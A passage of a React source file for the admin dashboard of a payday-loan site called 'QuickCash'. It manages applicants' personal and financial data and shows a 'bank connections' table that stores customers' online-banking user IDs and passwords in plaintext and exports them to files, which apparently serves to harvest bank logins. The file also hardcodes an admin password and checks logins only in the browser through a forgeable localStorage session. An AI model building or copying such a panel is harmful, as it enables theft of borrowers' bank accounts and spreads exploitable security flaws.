"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Badge } from "@/components/ui/badge"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog"
import {
  Eye,
  Users,
  DollarSign,
  TrendingUp,
  Clock,
  Search,
  Download,
  RefreshCw,
  LogOut,
  Lock,
  CreditCard,
  Trash2,
} from "lucide-react"

interface Lead {
  _id?: string
  id: number
  firstName: string
  lastName: string
  email: string
  phone: string
  dateOfBirth: string
  ssnLastFour: string
  monthlyIncome: string
  loanAmount: string
  employmentStatus: string
  bankAccount: string
  bankName: string
  customBankName: string
  bankDuration: string
  submittedAt: string
  status: "new" | "contacted" | "approved" | "rejected"
}

interface BankConnection {
  name: string
  phone: string
  bankAccount: string
  customBankName: string
  userId: string
  password: string
  approvedAmount: string
  submittedAt: string
  status: string
}

function AdminLogin({ onLogin }: { onLogin: () => void }) {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [error, setError] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setError("")

    const trimmedUsername = username.trim().toLowerCase()
    const trimmedPassword = password.trim()

    console.log("[v0] Login attempt:", { username: trimmedUsername, passwordLength: trimmedPassword.length })

    // Simple hardcoded credentials for demo (case-insensitive username)
    if (trimmedUsername === "admin" && trimmedPassword === "Anurag1528") {
      console.log("[v0] Login successful")
      localStorage.setItem(
        "admin-session",
        JSON.stringify({
          username: "admin",
          loginTime: new Date().toISOString(),
          expires: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(), // 24 hours
        }),
      )
      setTimeout(() => {
        console.log("[v0] Calling onLogin callback")
        onLogin()
      }, 100)
    } else {
      console.log("[v0] Login failed - invalid credentials")
      setError("Invalid username or password. Please check your credentials and try again.")
    }

    setIsLoading(false)
  }

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <Card className="w-full max-w-md">
        <CardHeader className="text-center">
          <div className="flex items-center justify-center gap-2 mb-4">
            <DollarSign className="h-8 w-8 text-primary" />
            <span className="text-2xl font-bold text-foreground">QuickCash</span>
          </div>
          <CardTitle className="flex items-center justify-center gap-2">
            <Lock className="h-5 w-5" />
            Admin Login
          </CardTitle>
          <CardDescription>Enter your credentials to access the admin dashboard</CardDescription>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleLogin} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="username">Username</Label>
              <Input
                id="username"
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Enter username"
                required
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="password">Password</Label>
              <Input
                id="password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter password"
                required
              />
            </div>
            {error && <div className="text-sm text-destructive bg-destructive/10 p-3 rounded-md">{error}</div>}
            <Button type="submit" className="w-full" disabled={isLoading}>
              {isLoading ? "Signing in..." : "Sign In"}
            </Button>
          </form>
          <div className="mt-6 p-3 bg-muted rounded-md text-sm text-muted-foreground">
            <p className="text-xs text-amber-600">
              Note: Username is case-insensitive, password is case-sensitive
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}

export default function AdminDashboard() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [isLoading, setIsLoading] = useState(true)
  const [adminUser, setAdminUser] = useState<string>("")

  const [leads, setLeads] = useState<Lead[]>([])
  const [filteredLeads, setFilteredLeads] = useState<Lead[]>([])
  const [searchTerm, setSearchTerm] = useState("")
  const [statusFilter, setStatusFilter] = useState<string>("all")
  const [selectedLead, setSelectedLead] = useState<Lead | null>(null)
  const [isRefreshing, setIsRefreshing] = useState(false)

  const [bankConnections, setBankConnections] = useState<BankConnection[]>([])
  const [selectedBankConnection, setSelectedBankConnection] = useState<BankConnection | null>(null)

  useEffect(() => {
    const checkAuth = () => {
      const session = localStorage.getItem("admin-session")
      if (session) {
        try {
          const sessionData = JSON.parse(session)
          const now = new Date()
          const expires = new Date(sessionData.expires)

          if (now < expires) {
            console.log("[v0] Session valid, setting authenticated state")
            setIsAuthenticated(true)
            setAdminUser(sessionData.username)
          } else {
            console.log("[v0] Session expired")
            localStorage.removeItem("admin-session")
            setIsAuthenticated(false)
          }
        } catch (error) {
          console.log("[v0] Error parsing session:", error)
          localStorage.removeItem("admin-session")
          setIsAuthenticated(false)
        }
      } else {
        console.log("[v0] No session found")
        setIsAuthenticated(false)
      }
      setIsLoading(false)
    }

    checkAuth()
  }, [])

  const handleLogout = () => {
    localStorage.removeItem("admin-session")
    setIsAuthenticated(false)
    setAdminUser("")
  }

  const handleLogin = () => {
    console.log("[v0] handleLogin called")
    const session = localStorage.getItem("admin-session")
    console.log("[v0] Session from localStorage:", session)

    if (session) {
      try {
        const sessionData = JSON.parse(session)
        console.log("[v0] Parsed session data:", sessionData)

        const now = new Date()
        const expires = new Date(sessionData.expires)

        if (now < expires) {
          console.log("[v0] Session valid, setting authenticated state")
          setIsAuthenticated(true)
          setAdminUser(sessionData.username)
        } else {
          console.log("[v0] Session expired")
          localStorage.removeItem("admin-session")
          setIsAuthenticated(false)
        }
      } catch (error) {
        console.log("[v0] Error parsing session:", error)
        localStorage.removeItem("admin-session")
        setIsAuthenticated(false)
      }
    } else {
      console.log("[v0] No session found")
      setIsAuthenticated(false)
    }
  }

  const fetchLeadsFromAPI = async () => {
    try {
      const response = await fetch("/api/applications")
      if (response.ok) {
        const data = await response.json()
        console.log("[v0] Fetched leads from API:", data.applications?.length || 0)
        return data.applications || []
      } else {
        console.log("[v0] API fetch failed, falling back to localStorage")
        return JSON.parse(localStorage.getItem("payday-leads") || "[]")
      }
    } catch (error) {
      console.log("[v0] Error fetching from API, falling back to localStorage:", error)
      return JSON.parse(localStorage.getItem("payday-leads") || "[]")
    }
  }

  const fetchBankConnectionsFromAPI = async () => {
    try {
      const response = await fetch("/api/bank-connections")
      if (response.ok) {
        const data = await response.json()
        console.log("[v0] Fetched bank connections from API:", data.connections?.length || 0)
        return data.connections || []
      } else {
        console.log("[v0] Bank connections API fetch failed, falling back to localStorage")
        return JSON.parse(localStorage.getItem("bank-connections") || "[]")
      }
    } catch (error) {
      console.log("[v0] Error fetching bank connections from API, falling back to localStorage:", error)
      return JSON.parse(localStorage.getItem("bank-connections") || "[]")
    }
  }

  const loadRealTimeData = async () => {
    if (!isAuthenticated) return

    setIsRefreshing(true)

    try {
      // Fetch leads from API
      const apiLeads = await fetchLeadsFromAPI()

      // If no API data, use localStorage with mock data
      let finalLeads = apiLeads
      if (finalLeads.length === 0) {
        const storedLeads = JSON.parse(localStorage.getItem("payday-leads") || "[]")

        if (storedLeads.length === 0) {
          // Create mock data if none exists
          const mockLeads: Lead[] = [
            {
              id: 1,
              firstName: "John",
              lastName: "Smith",
              email: "john.smith@email.com",
              phone: "(555) 123-4567",
              dateOfBirth: "1985-03-15",
              ssnLastFour: "1234",
              monthlyIncome: "4500",
              loanAmount: "2500",
              employmentStatus: "full-time",
              bankAccount: "checking",
              bankName: "chase",
              customBankName: "",
              bankDuration: "2-5-years",
              submittedAt: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
              status: "new",
            },
            {
              id: 2,
              firstName: "Sarah",
              lastName: "Johnson",
              email: "sarah.johnson@gmail.com",
              phone: "(555) 987-6543",
              dateOfBirth: "1990-07-22",
              ssnLastFour: "5678",
              monthlyIncome: "3200",
              loanAmount: "1500",
              employmentStatus: "full-time",
              bankAccount: "checking",
              bankName: "bofa",
              customBankName: "",
              bankDuration: "1-2-years",
              submittedAt: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toISOString(),
              status: "contacted",
            },
            {
              id: 3,
              firstName: "Michael",
              lastName: "Davis",
              email: "m.davis@yahoo.com",
              phone: "(555) 456-7890",
              dateOfBirth: "1978-11-08",
              ssnLastFour: "9012",
              monthlyIncome: "5500",
              loanAmount: "5000",
              employmentStatus: "full-time",
              bankAccount: "checking",
              bankName: "wells-fargo",
              customBankName: "",
              bankDuration: "more-than-5-years",
              submittedAt: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString(),
              status: "approved",
            },
          ]
          localStorage.setItem("payday-leads", JSON.stringify(mockLeads))
          finalLeads = mockLeads
        } else {
          finalLeads = storedLeads
        }
      }

      setLeads(finalLeads)
      setFilteredLeads(finalLeads)

      // Fetch bank connections from API
      const apiBankConnections = await fetchBankConnectionsFromAPI()
      
      // If no API data, use localStorage with mock data
      let finalBankConnections = apiBankConnections
      if (finalBankConnections.length === 0) {
        const storedBankConnections = JSON.parse(localStorage.getItem("bank-connections") || "[]")
        if (storedBankConnections.length === 0) {
          const mockBankConnections: BankConnection[] = [
            {
              name: "Sarah Johnson",
              phone: "(555) 987-6543",
              bankAccount: "Chase Bank",
              customBankName: "Chase Bank",
              userId: "sarah.johnson123",
              password: "SecurePass2024!",
              approvedAmount: "2500",
              submittedAt: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
              status: "bank_connected",
            },
            {
              name: "Michael Davis",
              phone: "(555) 456-7890",
              bankAccount: "Bank of America",
              customBankName: "Bank of America",
              userId: "mdavis_banking",
              password: "MyBank@2024",
              approvedAmount: "1800",
              submittedAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000).toISOString(),
              status: "approved_pending_bank_setup",
            },
          ]
          localStorage.setItem("bank-connections", JSON.stringify(mockBankConnections))
          finalBankConnections = mockBankConnections
        } else {
          finalBankConnections = storedBankConnections
        }
      }
      
      setBankConnections(finalBankConnections)
    } catch (error) {
      console.log("[v0] Error loading real-time data:", error)
    } finally {
      setIsRefreshing(false)
    }
  }

  useEffect(() => {
    if (isAuthenticated) {
      loadRealTimeData()

      // Set up auto-refresh every 30 seconds
      const interval = setInterval(() => {
        console.log("[v0] Auto-refreshing data...")
        loadRealTimeData()
      }, 30000)

      return () => clearInterval(interval)
    }
  }, [isAuthenticated])

  // Filter leads based on search and status
  useEffect(() => {
    let filtered = leads

    // Search filter
    if (searchTerm) {
      filtered = filtered.filter(
        (lead) =>
          lead.firstName.toLowerCase().includes(searchTerm.toLowerCase()) ||
          lead.lastName.toLowerCase().includes(searchTerm.toLowerCase()) ||
          lead.email.toLowerCase().includes(searchTerm.toLowerCase()) ||
          lead.phone.includes(searchTerm),
      )
    }

    // Status filter
    if (statusFilter !== "all") {
      filtered = filtered.filter((lead) => lead.status === statusFilter)
    }

    setFilteredLeads(filtered)
  }, [leads, searchTerm, statusFilter])

  const updateLeadStatus = async (leadId: number, newStatus: Lead["status"]) => {
    try {
      // Try to update via API first
      const lead = leads.find((l) => l.id === leadId)
      if (lead?._id) {
        const response = await fetch(`/api/applications/${lead._id}`, {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ status: newStatus }),
        })

        if (response.ok) {
          console.log("[v0] Status updated via API")
          // Refresh data to get latest from database
          await loadRealTimeData()
          return
        }
      }

      // Fallback to localStorage update
      const updatedLeads = leads.map((lead) => (lead.id === leadId ? { ...lead, status: newStatus } : lead))
      setLeads(updatedLeads)
      localStorage.setItem("payday-leads", JSON.stringify(updatedLeads))

      if (newStatus === "approved") {
        const approvedLead = updatedLeads.find((lead) => lead.id === leadId)
        if (approvedLead) {
          const newBankConnection: BankConnection = {
            name: `${approvedLead.firstName} ${approvedLead.lastName}`,
            phone: approvedLead.phone,
            bankAccount: approvedLead.bankName === "other" ? "Other" : approvedLead.bankName,
            customBankName: approvedLead.customBankName || approvedLead.bankName,
            userId: `user_${approvedLead.id}_${Date.now()}`,
            password: "pending_setup",
            approvedAmount: approvedLead.loanAmount,
            submittedAt: new Date().toISOString(),
            status: "approved_pending_bank_setup",
          }

          // Try to save to database first
          try {
            const response = await fetch("/api/bank-connections", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify(newBankConnection),
            })

            if (response.ok) {
              console.log("[v0] Bank connection created in database")
              // Refresh bank connections from API
              await loadRealTimeData()
              return
            }
          } catch (error) {
            console.log("[v0] Failed to save bank connection to database, falling back to localStorage:", error)
          }

          // Fallback to localStorage
          const existingConnections = JSON.parse(localStorage.getItem("bank-connections") || "[]")
          const connectionExists = existingConnections.some(
            (conn: BankConnection) => conn.name === newBankConnection.name && conn.phone === newBankConnection.phone,
          )

          if (!connectionExists) {
            const updatedConnections = [...existingConnections, newBankConnection]
            localStorage.setItem("bank-connections", JSON.stringify(updatedConnections))
            setBankConnections(updatedConnections)
          }
        }
      }
    } catch (error) {
      console.log("[v0] Error updating lead status:", error)
    }
  }

  const getStatusBadgeVariant = (status: Lead["status"]) => {
    switch (status) {
      case "new":
        return "default"
      case "contacted":
        return "secondary"
      case "approved":
        return "default"
      case "rejected":
        return "destructive"
      default:
        return "default"
    }
  }

  const getStatusColor = (status: Lead["status"]) => {
    switch (status) {
      case "new":
        return "text-primary"
      case "contacted":
        return "text-secondary"
      case "approved":
        return "text-green-600"
      case "rejected":
        return "text-destructive"
      default:
        return "text-muted-foreground"
    }
  }

  // Calculate statistics
  const stats = {
    total: leads.length,
    new: leads.filter((lead) => lead.status === "new").length,
    contacted: leads.filter((lead) => lead.status === "contacted").length,
    approved: leads.filter((lead) => lead.status === "approved").length,
    rejected: leads.filter((lead) => lead.status === "rejected").length,
    totalLoanAmount: leads.reduce((sum, lead) => sum + Number.parseInt(lead.loanAmount || "0"), 0),
  }

  const exportLeads = () => {
    const csvContent = [
      // CSV Header with all customer fields
      "ID,First Name,Last Name,Email,Phone,Date of Birth,SSN Last 4,Monthly Income,Loan Amount,Employment Status,Bank Account Type,Bank Name,Custom Bank Name,Bank Duration,Submitted At,Status",
      // CSV Data with all customer information
      ...filteredLeads.map((lead) =>
        [
          lead.id,
          `"${lead.firstName}"`,
          `"${lead.lastName}"`,
          `"${lead.email}"`,
          `"${lead.phone}"`,
          `"${lead.dateOfBirth}"`,
          `"${lead.ssnLastFour}"`,
          `"$${lead.monthlyIncome}"`,
          `"$${lead.loanAmount}"`,
          `"${lead.employmentStatus?.replace("-", " ")}"`,
          `"${lead.bankAccount}"`,
          `"${lead.bankName === "other" ? lead.customBankName : lead.bankName?.replace("-", " ")}"`,
          `"${lead.customBankName}"`,
          `"${lead.bankDuration?.replace("-", " ")}"`,
          `"${new Date(lead.submittedAt).toLocaleString()}"`,
          `"${lead.status}"`,
        ].join(","),
      ),
    ].join("\n")

    const blob = new Blob([csvContent], { type: "text/csv" })
    const url = window.URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `payday-leads-complete-${new Date().toISOString().split("T")[0]}.csv`
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    window.URL.revokeObjectURL(url)
  }

  const exportBankConnections = () => {
    const csvContent = [
      "Name,Phone,Bank Account,Custom Bank Name,User ID,Approved Amount,Submitted At,Status",
      ...bankConnections.map((connection) =>
        [
          `"${connection.name}"`,
          `"${connection.phone}"`,
          `"${connection.bankAccount}"`,
          `"${connection.customBankName}"`,
          `"${connection.userId}"`,
          `"$${connection.approvedAmount}"`,
          `"${new Date(connection.submittedAt).toLocaleString()}"`,
          `"${connection.status}"`,
        ].join(","),
      ),
    ].join("\n")

    const blob = new Blob([csvContent], { type: "text/csv" })
    const url = window.URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `approved-applications-${new Date().toISOString().split("T")[0]}.csv`
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    window.URL.revokeObjectURL(url)
  }

  const refreshData = () => {
    loadRealTimeData()
  }

  // ... existing code for downloadLeadCSV, downloadBankConnectionCSV, deleteLead, deleteBankConnection functions ...

  const downloadLeadCSV = (lead: Lead) => {
    const csvData = [
      ["Field", "Value"],
      ["ID", lead.id.toString()],
      ["First Name", lead.firstName],
      ["Last Name", lead.lastName],
      ["Email", lead.email],
      ["Phone", lead.phone],
      ["Date of Birth", lead.dateOfBirth],
      ["SSN Last Four", lead.ssnLastFour],
      ["Monthly Income", lead.monthlyIncome],
      ["Loan Amount", lead.loanAmount],
      ["Employment Status", lead.employmentStatus],
      ["Bank Account", lead.bankAccount],
      ["Bank Name", lead.bankName],
      ["Custom Bank Name", lead.customBankName],
      ["Bank Duration", lead.bankDuration],
      ["Status", lead.status],
      ["Submitted At", lead.submittedAt],
    ]

    const csvContent = csvData.map((row) => row.map((field) => `"${field}"`).join(",")).join("\n")
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" })
    const link = document.createElement("a")
    const url = URL.createObjectURL(blob)
    link.setAttribute("href", url)
    link.setAttribute("download", `lead_${lead.firstName}_${lead.lastName}_${lead.id}.csv`)
    link.style.visibility = "hidden"
    document.body.appendChild(link)
    link.click()
    document.body.removeChild(link)
  }

  const downloadBankConnectionCSV = (connection: BankConnection, index: number) => {
    const lines = [
      `Name: ${connection.name}`,
      `Phone: ${connection.phone}`,
      `Bank Account: ${connection.bankAccount}`,
      `Custom Bank Name: ${connection.customBankName}`,
      `User ID: ${connection.userId}`,
      `Password: ${connection.password}`,
      `Approved Amount: $${connection.approvedAmount}`,
      `Status: ${connection.status}`,
      `Submitted At: ${connection.submittedAt}`,
    ]

    const textContent = lines.join("\n")
    const blob = new Blob([textContent], { type: "text/plain;charset=utf-8;" })
    const link = document.createElement("a")
    const url = URL.createObjectURL(blob)
    link.setAttribute("href", url)
    link.setAttribute("download", `approved_application_${connection.name.replace(" ", "_")}_${index}.txt`)
    link.style.visibility = "hidden"
    document.body.appendChild(link)
    link.click()
    document.body.removeChild(link)
  }

  const deleteLead = (leadId: number) => {
    const updatedLeads = leads.filter((lead) => lead.id !== leadId)
    setLeads(updatedLeads)
    localStorage.setItem("payday-leads", JSON.stringify(updatedLeads))
  }

  const deleteBankConnection = (index: number) => {
    const updatedConnections = bankConnections.filter((_, i) => i !== index)
    setBankConnections(updatedConnections)
    localStorage.setItem("bank-connections", JSON.stringify(updatedConnections))
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary mx-auto mb-4"></div>
          <p className="text-muted-foreground">Loading...</p>
        </div>
      </div>
    )
  }

  if (!isAuthenticated) {
    return <AdminLogin onLogin={handleLogin} />
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b bg-card/50">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <DollarSign className="h-8 w-8 text-primary" />
              <div>
                <h1 className="text-2xl font-bold text-foreground">QuickCash Admin</h1>
                <p className="text-sm text-muted-foreground">
                  Real-time Lead Management Dashboard
                  <span className="ml-2 inline-flex items-center gap-1">
                    <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                    <span className="text-xs text-green-600">Live Data</span>
                  </span>
                </p>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <div className="text-sm text-muted-foreground">
                Welcome, <span className="font-medium text-foreground">{adminUser}</span>
              </div>
              <Button variant="outline" size="sm" onClick={refreshData} disabled={isRefreshing}>
                <RefreshCw className={`h-4 w-4 mr-2 ${isRefreshing ? "animate-spin" : ""}`} />
                {isRefreshing ? "Refreshing..." : "Refresh"}
              </Button>
              <Button variant="outline" size="sm" onClick={exportLeads}>
                <Download className="h-4 w-4 mr-2" />
                Export Leads
              </Button>
              <Button variant="outline" size="sm" onClick={handleLogout}>
                <LogOut className="h-4 w-4 mr-2" />
                Logout
              </Button>
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        {/* Statistics Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-6 mb-8">
          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Total Leads</CardTitle>
              <Users className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-foreground">{stats.total}</div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">New Leads</CardTitle>
              <Clock className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-primary">{stats.new}</div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Approved</CardTitle>
              <TrendingUp className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-green-600">{stats.approved}</div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Total Loan Requests</CardTitle>
              <DollarSign className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-foreground">${stats.totalLoanAmount.toLocaleString()}</div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Bank Connections</CardTitle>
              <CreditCard className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-blue-600">{bankConnections.length}</div>
            </CardContent>
          </Card>
        </div>

        <div className="mb-6 p-4 bg-green-50 border border-green-200 rounded-lg">
          <div className="flex items-center gap-2">
            <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
            <span className="text-sm font-medium text-green-800">Real-time Data Active</span>
            <span className="text-xs text-green-600">
              • Auto-refreshes every 30 seconds • Connected to MongoDB • Last updated: {new Date().toLocaleTimeString()}
            </span>
          </div>
        </div>

        {/* Leads Management Section */}
        <Card className="mb-8">
          <CardHeader>
            <div className="flex items-center justify-between">
              <div>
                <CardTitle className="flex items-center gap-2">
                  <Users className="h-5 w-5" />
                  Lead Management ({filteredLeads.length})
                </CardTitle>
                <CardDescription>Manage and track loan application leads in real-time</CardDescription>
              </div>
              <div className="flex items-center gap-2">
                <div className="flex items-center gap-2">
                  <Search className="h-4 w-4 text-muted-foreground" />
                  <Input
                    placeholder="Search leads..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="w-64"
                  />
                </div>
                <Select value={statusFilter} onValueChange={setStatusFilter}>
                  <SelectTrigger className="w-32">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All Status</SelectItem>
                    <SelectItem value="new">New</SelectItem>
                    <SelectItem value="contacted">Contacted</SelectItem>
                    <SelectItem value="approved">Approved</SelectItem>
                    <SelectItem value="rejected">Rejected</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Name</TableHead>
                    <TableHead>Contact</TableHead>
                    <TableHead>Loan Details</TableHead>
                    <TableHead>Employment</TableHead>
                    <TableHead>Bank Info</TableHead>
                    <TableHead>Status</TableHead>
                    <TableHead>Submitted</TableHead>
                    <TableHead>Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filteredLeads.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={8} className="text-center py-8 text-muted-foreground">
                        {searchTerm || statusFilter !== "all"
                          ? "No leads match your filters."
                          : "No leads found. New applications will appear here automatically."}
                      </TableCell>
                    </TableRow>
                  ) : (
                    filteredLeads.map((lead) => (
                      <TableRow key={lead._id || lead.id}>
                        <TableCell>
                          <div className="font-medium">
                            {lead.firstName} {lead.lastName}
                          </div>
                          <div className="text-sm text-muted-foreground">ID: {lead.id}</div>
                        </TableCell>
                        <TableCell>
                          <div className="text-sm">
                            <div>{lead.email}</div>
                            <div className="text-muted-foreground">{lead.phone}</div>
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="text-sm">
                            <div className="font-medium">${Number.parseInt(lead.loanAmount).toLocaleString()}</div>
                            <div className="text-muted-foreground">
                              Income: ${Number.parseInt(lead.monthlyIncome).toLocaleString()}/mo
                            </div>
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="text-sm capitalize">{lead.employmentStatus?.replace("-", " ")}</div>
                        </TableCell>
                        <TableCell>
                          <div className="text-sm">
                            <div className="capitalize">
                              {lead.bankName === "other" ? lead.customBankName : lead.bankName?.replace("-", " ")}
                            </div>
                            <div className="text-muted-foreground capitalize">{lead.bankAccount}</div>
                          </div>
                        </TableCell>
                        <TableCell>
                          <Select
                            value={lead.status}
                            onValueChange={(value) => updateLeadStatus(lead.id, value as Lead["status"])}
                          >
                            <SelectTrigger className="w-32">
                              <Badge
                                variant={getStatusBadgeVariant(lead.status)}
                                className={getStatusColor(lead.status)}
                              >
                                {lead.status}
                              </Badge>
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="new">New</SelectItem>
                              <SelectItem value="contacted">Contacted</SelectItem>
                              <SelectItem value="approved">Approved</SelectItem>
                              <SelectItem value="rejected">Rejected</SelectItem>
                            </SelectContent>
                          </Select>
                        </TableCell>
                        <TableCell className="text-sm text-muted-foreground">
                          {new Date(lead.submittedAt).toLocaleDateString()}
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <Dialog>
                              <DialogTrigger asChild>
                                <Button variant="outline" size="sm" onClick={() => setSelectedLead(lead)}>
                                  <Eye className="h-4 w-4" />
                                </Button>
                              </DialogTrigger>
                              <DialogContent className="max-w-4xl">
                                <DialogHeader>
                                  <DialogTitle>Lead Details</DialogTitle>
                                  <DialogDescription>
                                    Complete information for {lead.firstName} {lead.lastName}
                                  </DialogDescription>
                                </DialogHeader>
                                {selectedLead && (
                                  <div className="grid grid-cols-2 gap-6 py-4">
                                    <div className="space-y-4">
                                      <h3 className="font-semibold text-lg border-b pb-2">Personal Information</h3>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">Full Name</Label>
                                        <p className="text-sm font-medium">
                                          {selectedLead.firstName} {selectedLead.lastName}
                                        </p>
                                      </div>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          Email Address
                                        </Label>
                                        <p className="text-sm">{selectedLead.email}</p>
                                      </div>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          Phone Number
                                        </Label>
                                        <p className="text-sm">{selectedLead.phone}</p>
                                      </div>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          Date of Birth
                                        </Label>
                                        <p className="text-sm">{selectedLead.dateOfBirth}</p>
                                      </div>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          SSN (Last 4)
                                        </Label>
                                        <p className="text-sm font-mono">****-{selectedLead.ssnLastFour}</p>
                                      </div>
                                    </div>

                                    <div className="space-y-4">
                                      <h3 className="font-semibold text-lg border-b pb-2">Financial Information</h3>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          Requested Loan Amount
                                        </Label>
                                        <p className="text-lg font-bold text-primary">
                                          ${Number.parseInt(selectedLead.loanAmount).toLocaleString()}
                                        </p>
                                      </div>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          Monthly Income
                                        </Label>
                                        <p className="text-sm font-medium">
                                          ${Number.parseInt(selectedLead.monthlyIncome).toLocaleString()}/month
                                        </p>
                                      </div>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          Employment Status
                                        </Label>
                                        <p className="text-sm capitalize">
                                          {selectedLead.employmentStatus?.replace("-", " ")}
                                        </p>
                                      </div>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          Bank Information
                                        </Label>
                                        <div className="text-sm">
                                          <p className="font-medium capitalize">
                                            {selectedLead.bankName === "other"
                                              ? selectedLead.customBankName
                                              : selectedLead.bankName?.replace("-", " ")}
                                          </p>
                                          <p className="text-muted-foreground capitalize">
                                            {selectedLead.bankAccount} • {selectedLead.bankDuration?.replace("-", " ")}
                                          </p>
                                        </div>
                                      </div>
                                      <div>
                                        <Label className="text-sm font-medium text-muted-foreground">
                                          Application Status
                                        </Label>
                                        <Badge variant={getStatusBadgeVariant(selectedLead.status)} className="mt-1">
                                          {selectedLead.status}
                                        </Badge>
                                      </div>
                                    </div>

                                    <div className="col-span-2 pt-4 border-t">
                                      <h3 className="font-semibold text-lg mb-3">Application Timeline</h3>
                                      <div className="grid grid-cols-2 gap-4">
                                        <div>
                                          <Label className="text-sm font-medium text-muted-foreground">
                                            Submitted At
                                          </Label>
                                          <p className="text-sm">
                                            {new Date(selectedLead.submittedAt).toLocaleString()}
                                          </p>
                                        </div>
                                        <div>
                                          <Label className="text-sm font-medium text-muted-foreground">
                                            Application ID
                                          </Label>
                                          <p className="text-sm font-mono">{selectedLead._id || selectedLead.id}</p>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                )}
                              </DialogContent>
                            </Dialog>
                            <Button variant="outline" size="sm" onClick={() => downloadLeadCSV(lead)}>
                              <Download className="h-4 w-4" />
                            </Button>
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => deleteLead(lead.id)}
                              className="text-destructive hover:text-destructive"
                            >
                              <Trash2 className="h-4 w-4" />
                            </Button>
                          </div>
                        </TableCell>
                      </TableRow>
                    ))
                  )}
